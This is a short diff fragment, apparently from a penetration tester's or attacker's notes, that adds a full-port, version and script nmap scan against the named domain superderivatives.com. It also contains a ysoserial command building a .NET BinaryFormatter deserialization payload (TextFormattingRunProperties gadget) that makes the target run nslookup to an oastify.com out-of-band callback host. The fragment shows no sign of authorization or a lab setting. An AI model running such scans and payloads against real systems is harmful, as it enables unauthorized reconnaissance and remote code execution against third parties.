@@ -1,3 +1,5 @@
+nmap -p- -sV -sC -A superderivatives.com | tee nmap_output.txt
+
 # PAYLOAD 1: TextFormattingRunProperties + DNS (BinaryFormatter - base64)
 ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload1.txt
 
